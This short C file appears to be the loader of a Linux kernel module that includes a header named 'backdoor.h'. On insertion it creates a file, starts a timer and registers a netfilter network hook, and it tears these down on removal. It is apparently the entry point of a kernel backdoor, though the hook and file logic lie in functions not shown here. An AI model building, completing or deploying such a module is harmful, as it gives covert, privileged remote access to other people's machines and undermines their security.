#include "backdoor.h"

struct timer_list *timer;

static int __init init_mod(void){
	printk("Inserting module\n");
	create_file();
	timer = create_timer(10000);
	if (timer){
		return nfhook_init();
	}
	return -1;
}

static void __exit exit_mod(void){
	printk("Removing module\n");
	destroy_file();
	nfhook_exit();
}

module_init(init_mod);
module_exit(exit_mod);
